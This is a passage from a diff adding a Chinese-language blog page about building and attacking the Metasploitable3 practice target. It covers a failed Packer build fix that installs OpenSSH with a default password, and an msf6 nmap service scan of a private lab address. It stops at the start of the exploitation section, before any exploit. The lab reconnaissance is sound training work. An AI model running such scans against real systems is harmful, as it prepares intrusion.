+<li><p>卡在 <code>==&gt; vmware-iso: Waiting for SSH to become available...</code></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploitable3/issues/573">https://github.com/rapid7/metasploitable3/issues/573</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploitable3/issues/70">https://github.com/rapid7/metasploitable3/issues/70</a></p>
+<p>查看 packer&#x2F;answer_files&#x2F;2008_r2&#x2F;Autounattend.xml，可以定位到出问题的语句</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CommandLine</span><span class="token punctuation">></span></span>cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File a:\openssh.ps1 -AutoStart<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CommandLine</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在vnc连接的虚拟机中运行，观察报错</p>
+<p><img src="/blog/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610180608279.png" alt="image-20250610180608279"></p>
+<p>可知是网络环境问题</p>
+<p>请让代理支持局域网连接，然后设置虚拟机里的LAN代理</p>
+<p>接下来手动执行 a:\openssh.ps1 里这一部分的操作</p>
+<p><img src="/blog/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610180735501.png" alt="image-20250610180735501"></p>
+<p>访问 <a target="_blank" rel="noopener" href="http://www.mls-software.com/files/setupssh-7.1p1-1.exe">http://www.mls-software.com/files/setupssh-7.1p1-1.exe</a></p>
+<p>下载到 C:\Windows\Temp\openssh.exe，注意文件完整性</p>
+<p>然后手动执行即可<code>Start-Process &quot;C:\Windows\Temp\openssh.exe&quot; &quot;/S /port=2222 /privsep=1 /password=D@rj33l1ng&quot; -NoNewWindow -Wait</code></p>
+<p>成功则再次运行 <code>powershell.exe -File a:\openssh.ps1 -AutoStart</code> 即可</p>
+</li>
+<li><p><code>Start-Service &quot;OpenSSHd&quot;</code>失败，搞不定了</p>
+</li>
+</ul>
+<br>
+
+<p>最后还是采用了网盘下载法，搞了个别人封装好的镜像</p>
+<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> db_nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-n</span> <span class="token number">192.168</span>.253.139
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: PORT      STATE SERVICE              VERSION
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">21</span>/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>                  Microsoft ftpd
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>                  OpenSSH <span class="token number">7.1</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">80</span>/tcp    <span class="token function">open</span>  http                 Microsoft IIS httpd <span class="token number">7.5</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc                Microsoft Windows RPC
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn          Microsoft Windows netbios-ssn
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds         Microsoft Windows Server <span class="token number">2008</span> R2 - <span class="token number">2012</span> microsoft-ds
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">3306</span>/tcp  <span class="token function">open</span>  mysql                MySQL <span class="token number">5.5</span>.20-log
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">3389</span>/tcp  <span class="token function">open</span>  tcpwrapped
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">4848</span>/tcp  <span class="token function">open</span>  ssl/http             Oracle Glassfish Application Server
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">7676</span>/tcp  <span class="token function">open</span>  java-message-service Java Message Service <span class="token number">301</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8009</span>/tcp  <span class="token function">open</span>  ajp13                Apache Jserv <span class="token punctuation">(</span>Protocol v1.3<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8022</span>/tcp  <span class="token function">open</span>  http                 Apache Tomcat/Coyote JSP engine <span class="token number">1.1</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8031</span>/tcp  <span class="token function">open</span>  ssl/unknown
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8080</span>/tcp  <span class="token function">open</span>  http                 Sun GlassFish Open Source Edition  <span class="token number">4.0</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8181</span>/tcp  <span class="token function">open</span>  ssl/http             Oracle GlassFish <span class="token number">4.0</span> <span class="token punctuation">(</span>Servlet <span class="token number">3.1</span><span class="token punctuation">;</span> JSP <span class="token number">2.3</span><span class="token punctuation">;</span> Java <span class="token number">1.8</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8383</span>/tcp  <span class="token function">open</span>  http                 Apache httpd
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">8443</span>/tcp  <span class="token function">open</span>  ssl/https-alt?
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">9200</span>/tcp  <span class="token function">open</span>  wap-wsp?
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">49152</span>/tcp <span class="token function">open</span>  msrpc                Microsoft Windows RPC
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">49153</span>/tcp <span class="token function">open</span>  msrpc                Microsoft Windows RPC
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">49154</span>/tcp <span class="token function">open</span>  msrpc                Microsoft Windows RPC
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">49155</span>/tcp <span class="token function">open</span>  msrpc                Microsoft Windows RPC
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">49158</span>/tcp <span class="token function">open</span>  unknown
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">49160</span>/tcp <span class="token function">open</span>  java-rmi             Java RMI
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: <span class="token number">49161</span>/tcp <span class="token function">open</span>  tcpwrapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h3>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
